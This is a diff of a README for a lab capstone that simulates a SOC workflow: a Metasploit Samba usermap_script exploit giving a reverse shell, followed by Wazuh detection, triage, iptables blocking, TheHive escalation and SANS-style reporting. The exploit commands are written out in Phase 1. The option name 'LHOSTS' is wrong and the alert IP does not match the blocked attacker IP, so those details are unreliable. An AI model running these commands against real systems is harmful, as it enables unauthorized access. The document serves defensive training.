@@ -1,30 +1,231 @@
+# 🚀 Capstone Project: Full SOC Workflow Simulation
+
+## 🎯 Objective
+
+This project simulates a complete Security Operations Center (SOC) workflow, including attack execution, detection, triage, response, escalation, and reporting. The goal is to demonstrate real-world incident handling using industry-standard tools and methodologies.
 
 ---
 
-## 🚨 Escalation (100 words)
-A critical exploit was detected targeting a Samba vulnerability. The attacker gained access, triggering Wazuh alerts. Immediate containment actions were taken. The incident aligns with MITRE T1210 and is escalated for further analysis.
+## 🏗️ Lab Architecture
 
-
-**Executive Summary:**  
-A simulated attack successfully demonstrated exploitation and detection.
-
-**Timeline:**  
-Attack initiated and detected via Wazuh.
-
-**Response:**  
-System isolated and attacker blocked.
-
-**Recommendations:**  
-Patch systems and monitor logs.
-
----
-A security incident was detected and contained. The attacker exploited a vulnerability but was quickly blocked. No major damage occurred. Improvements in patching and monitoring are recommended.
+```
+Kali Linux (Attacker)
+        ↓
+Metasploitable2 (Target + Wazuh Agent)
+        ↓
+Wazuh Server (Detection & Analysis)
+        ↓
+TheHive (Incident Management)
+```
 
 ---
 
-## 📸 Screenshots
-- Metasploit exploit
-- Shell access
-- Wazuh alert
-- IP block
-- TheHive case
+## 🛠️ Tools Used
+
+* Metasploit (Attack simulation)
+* Wazuh (SIEM & detection)
+* TheHive (Incident response platform)
+* iptables (Containment)
+* VirusTotal & OTX (Threat intelligence)
+* Linux utilities (ssh, netstat, logs)
+
+---
+
+# 🔥 Phase 1: Attack Simulation
+
+## 📌 Method
+
+A known vulnerability in Samba was exploited using Metasploit.
+
+## ⚙️ Commands Used
+
+```bash
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.231.135
+set LHOSTS 192.168.231.137
+run
+```
+
+## 🎯 Result
+
+* Reverse shell obtained
+* Unauthorized access confirmed
+
+```bash
+whoami
+uname -a
+```
+
+## 🧠 Analysis
+
+This demonstrates exploitation of remote services, mapped to:
+
+* **MITRE ATT&CK:** T1210 (Exploitation of Remote Services)
+
+---
+
+# 🔍 Phase 2: Detection (Wazuh)
+
+## 📌 Process
+
+Wazuh monitored system logs and generated alerts based on suspicious activity.
+
+## 📊 Detection Evidence
+
+| Timestamp           | Source IP       | Alert Description      | MITRE Technique |
+| ------------------- | --------------- | ---------------------- | --------------- |
+| 2026-04-03 12:07:40 | 192.168.231.133 | Samba exploit activity | T1210           |
+
+## 🔎 Observations
+
+* Suspicious network activity detected
+* Logs correlated with attack timeline
+* Alerts generated based on abnormal behavior
+
+---
+
+# 🧠 Phase 3: Alert Triage
+
+## 📌 Analysis Steps
+
+* Reviewed alert severity (high)
+* Verified repeated suspicious behavior
+* Correlated logs with attack timeline
+
+## ✅ Conclusion
+
+The alert was confirmed as a **true positive**, indicating successful exploitation.
+
+---
+
+# 🌐 Phase 4: Threat Intelligence Enrichment
+
+## 📌 Process
+
+Indicators of Compromise (IOCs) were validated using external sources:
+
+* VirusTotal
+* AlienVault OTX (API + Web)
+
+## 🔍 Findings
+
+* IP associated with suspicious/malicious activity
+* Linked to known scanning infrastructure
+* Historical threat intelligence data available
+
+## 🧠 Insight
+
+Threat intelligence confirmed the legitimacy of the alert and improved confidence in detection.
+
+---
+
+# 🛡️ Phase 5: Response & Containment
+
+## 📌 Action Taken
+
+The attacker IP was blocked using firewall rules:
+
+```bash
+sudo iptables -A INPUT -s 192.168.231.137 -j DROP
+```
+
+## ✅ Verification
+
+```bash
+ping <target-ip>
+```
+
+* Connection blocked successfully
+* No further communication from attacker
+
+## 🧠 Outcome
+
+The threat was contained, preventing further exploitation or lateral movement.
+
+---
+
+# 🚨 Phase 6: Incident Escalation (TheHive)
+
+## 📌 Case Creation
+
+A case was created in TheHive with the following details:
+
+* **Title:** Samba Exploit Detected
+* **Severity:** High
+* **Tags:** T1210, Exploit
+
+## 📝 Escalation Summary
+
+A critical security incident involving exploitation of a Samba vulnerability was detected. The attacker gained unauthorized access to the system, triggering alerts in Wazuh. Immediate containment actions were taken, including isolating the system and blocking the attacker IP. The incident aligns with MITRE ATT&CK technique T1210 and has been escalated for further forensic investigation.
+
+---
+
+# 📄 Phase 7: Incident Report (SANS Format)
+
+## 🧾 Executive Summary
+
+A simulated cyberattack exploiting a Samba vulnerability was successfully executed and detected. The attacker gained unauthorized access to the system. Detection mechanisms identified the activity, and response actions were taken promptly to contain the threat.
+
+## ⏱️ Timeline
+
+* Attack initiated using Metasploit
+* Wazuh generated alerts
+* Analyst investigated logs
+* System isolated and attacker blocked
+
+## 🛠️ Response Actions
+
+* Identified compromised system
+* Blocked attacker IP
+* Analyzed logs and confirmed exploitation
+
+## 🔐 Recommendations
+
+* Apply regular security patches
+* Disable unnecessary services
+* Implement continuous monitoring
+* Strengthen authentication controls
+
+---
+
+# 🧾 Phase 8: Manager Briefing (Non-Technical)
+
+A cybersecurity incident was detected involving unauthorized system access through a known vulnerability. The attack was quickly identified and contained using monitoring tools. The affected system was isolated, and the attacker was blocked. No significant damage was observed. Future prevention includes improving patch management and monitoring systems.
+
+---
+
+# 📸 Evidence & Screenshots
+
+Include the following:
+
+* Metasploit exploitation (shell access)
+* `whoami` command output
+* Wazuh alert logs
+* Blocked connection (ping failure)
+* TheHive case dashboard
+* Threat intelligence results (OTX / VirusTotal)
+
+---
+
+# 🔁 SOC Workflow Summary
+
+```
+Attack → Detection → Triage → Enrichment → Response → Escalation → Reporting
+```
+
+---
+
+# 🧠 Key Learnings
+
+* Real-world attack simulation improves detection skills
+* Log correlation is critical for identifying threats
+* Threat intelligence enhances alert validation
+* Rapid response reduces impact
+* Proper documentation is essential in SOC operations
+
+---
+
+# ⚠️ Conclusion
+
+This project demonstrates a complete SOC workflow from attack simulation to incident reporting. It highlights the importance of detection, validation, and response in cybersecurity operations, providing hands-on experience aligned with real-world SOC practices.
